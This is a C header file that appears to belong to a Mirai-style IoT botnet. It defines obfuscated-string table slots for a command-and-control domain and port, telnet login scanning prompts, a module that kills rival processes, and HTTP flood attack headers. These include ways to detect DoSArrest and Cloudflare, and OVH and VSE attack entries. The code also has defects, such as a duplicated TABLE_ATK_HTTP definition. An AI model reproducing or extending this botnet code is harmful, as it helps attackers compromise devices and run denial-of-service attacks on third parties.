#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};
		
#define TABLE_PROCESS_ARGV              0
#define TABLE_EXEC_SUCCESS              1
#define TABLE_CNC_DOMAIN                2
#define TABLE_CNC_PORT                  3                       
#define TABLE_SCAN_CB_DOMAIN            4
#define TABLE_SCAN_CB_PORT              5
#define TABLE_SCAN_SHELL                6
#define TABLE_SCAN_ENABLE               7
#define TABLE_SCAN_SYSTEM               8
#define TABLE_SCAN_SH                   9
#define TABLE_SCAN_QUERY                10
#define TABLE_SCAN_RESP                 11
#define TABLE_SCAN_NCORRECT             12
#define TABLE_SCAN_PS                   13
#define TABLE_SCAN_KILL_9               14
#define TABLE_KILLER_PROC               15
#define TABLE_KILLER_EXE                16
#define TABLE_KILLER_FD                 17
#define TABLE_KILLER_MAPS               18
#define TABLE_KILLER_TCP                19                    
#define TABLE_ATK_RESOLVER              20
#define TABLE_ATK_NSERV                 21 
#define TABLE_MISC_WATCHDOG				22
#define TABLE_MISC_WATCHDOG2			23
#define TABLE_SCAN_ASSWORD				24
#define TABLE_SCAN_OGIN					25
#define TABLE_SCAN_ENTER				26
#define TABLE_MISC_RAND					27 

//HTTP Shit
#define TABLE_ATK_KEEP_ALIVE            28  /* "Connection: keep-alive" */
#define TABLE_ATK_ACCEPT                29  // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
#define TABLE_ATK_ACCEPT_LNG            30  // "Accept-Language: en-US,en;q=0.8"
#define TABLE_ATK_CONTENT_TYPE          31  // "Content-Type: application/x-www-form-urlencoded"
#define TABLE_ATK_SET_COOKIE            32  // "setCookie('"
#define TABLE_ATK_REFRESH_HDR           33  // "refresh:"
#define TABLE_ATK_LOCATION_HDR          34  // "location:"
#define TABLE_ATK_SET_COOKIE_HDR        35  // "set-cookie:"
#define TABLE_ATK_CONTENT_LENGTH_HDR    36  // "content-length:"
#define TABLE_ATK_TRANSFER_ENCODING_HDR 37  // "transfer-encoding:"
#define TABLE_ATK_CHUNKED               38  // "chunked"
#define TABLE_ATK_KEEP_ALIVE_HDR        39  // "keep-alive"
#define TABLE_ATK_CONNECTION_HDR        40  // "connection:"
#define TABLE_ATK_DOSARREST             41  // "server: dosarrest"
#define TABLE_ATK_CLOUDFLARE_NGINX      42  // "server: cloudflare-nginx"

/* User agent strings */
#define TABLE_HTTP_ONE                  43  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_TWO                  44  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_THREE                45  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_FOUR                 46  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_FIVE                 47  /* "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" */
#define TABLE_HTTP_6                    48
#define TABLE_HTTP_7                    49
#define TABLE_HTTP_8                    50
#define TABLE_HTTP_9                    51
#define TABLE_HTTP_10                   52
#define TABLE_HTTP_11                   53
#define TABLE_HTTP_12                   54
#define TABLE_HTTP_13                   55
#define TABLE_HTTP_14                   56
#define TABLE_HTTP_15                   57
/* HTTP Headers Agents + Cookie */
#define TABLE_ATK_HTTP                  58
#define TABLE_ATK_USERAGENT             59
#define TABLE_ATK_HOST                  60
#define TABLE_ATK_HTTP                  61
#define TABLE_ATK_COOKIE                62
#define TABLE_ATK_SEARCHHTTP            63
#define TABLE_ATK_URL                   64
#define TABLE_ATK_POST                  65
#define TABLE_SSL_GET                   67
#define TABLE_ATK_VSE                   68
#define TABLE_ATK_OVH                   69
#define TABLE_MAX_KEYS  106

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
